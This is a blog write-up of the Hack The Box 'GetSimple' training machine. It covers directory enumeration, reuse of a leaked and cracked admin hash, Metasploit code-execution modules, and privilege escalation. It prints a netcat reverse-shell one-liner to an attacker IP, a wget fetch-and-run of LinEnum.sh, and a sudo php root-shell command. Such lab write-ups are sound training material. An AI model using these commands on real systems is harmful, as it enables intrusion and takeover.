---
title: 'HTB GetSimple Writeup'
date: 2025-06-06
permalink: /posts/2025/06/HTB_GetSimple_Writeup/
tags:
  - HTB
  - writeup
  - easy
---

Hi and welcome to this writeup of the GetSimple machine of the Knowledge check in the getting started HTB course.


HTB_GetSimple
======

# Enumeration

The site uses GetSimple CMS, which is a flatfile CMS that works fast and it is written in PHP: [https://get-simple.info/](https://get-simple.info/)

It uses Apache HTTP Server 2.4.41

An Nmap scan shows that there is a `/admin/` page present. Going there in the browser shows us a login page. `nmap -sV -sC 10.129.185.160`

Lets enumerate the directory with Gobuster: `gobuster dir -u http://10.129.185.160 -w /usr/share/seclists/Discovery/Web-Content/common.txt`

This shows us the `/admin`, `/backups`, `/data`, `/plugins`, `/sitemap.xml` and `/theme`

Lets dig through these dirs and see what we can find.

The `/data/`cache shows a message `“your_version":"3.3.15","message":"You have an old version - please upgrade”.`

In `/data/other/autorisation.xml` contains a api key: `4f399dc72ff8e619e327800f851e9986`

In `/data/users/admin.xml` is a username and password: `admin@d033e22ae348aeb5660fc2140aec35850c4da997`

And an email: [admin@gettingstarted.com](mailto:admin@gettingstarted.com)

The `/plugins` shows us a php InnovationPlugin and anonymous_data plugin.

The obtained admin password looks hashed. Lets try to find out the hash type: SHA1. Searching Google shows us that this is a hash of the string: admin

Back to the `/admin` page we can login with `admin@admin` and we are in!

Searching trough the admin panel, I see a File upload option.

Searching for “getsimple exploit” gets us a File Upload Vulnerability: [https://www.rapid7.com/db/modules/exploit/unix/webapp/get_simple_cms_upload_exec/](https://www.rapid7.com/db/modules/exploit/unix/webapp/get_simple_cms_upload_exec/)

With a corresponding Metasploit module: `unix/webapp/get_simple_cms_upload_exec`

Let’s try to run this module on our target machine: `use exploit/unix/webapp/get_simple_cms_upload_exec`

<img src='/images/HTB_GetSimple/afbeelding.png'>

I couldn’t get this exploit to work unfortunately.
I next tried the `“multi/http/getsimplecms_unauth_code_exec”` module.

<img src='/images/HTB_GetSimple/afbeelding 1.png'>

And yess this time it worked. I’m in!

The user flag can be found in `/home/mrb3n`.

# Privilege Escalation

Next we have to enumerate the system again to gain root access.

Type “`shell`” to drop into a system command shell to run commands.

Upgrade the tty of the shell with: `python3 -c 'import pty; pty.spawn("/bin/bash")'`

Now, go to the `/tmp` dir on the remote host because of the write permissions.

Now start a python server in your machine where the LinEnmum.sh file is located: `python3 -m http.server 8000`

And get the file from the remote host with: `wget http://10.10.15.40:8000/LinEnum.sh`

Now set the right permissions to the file with: `chmod +x LinEnum.sh`

And run the file: `./LinEnum.sh`

We see a username: `mrb3n`

And a possible sudo pawnage in the `/usr/bin/php` folder!

This could also be discovered with the “`sudo -i`” command.

<img src='/images/HTB_GetSimple/afbeelding 2.png'>

We could add a reverse shell one-liner to the end of the php file like so: `echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.40 8443 >/tmp/f' | tee -a php`

Catch the root shell on our machine with a nc listener: `nc -lvnp 8443`

But is this case we can run the following command to get an interactive shell as the root user: `sudo /usr/bin/php -r 'system("/bin/bash");'`

The `root.txt` flag is present in the root directory.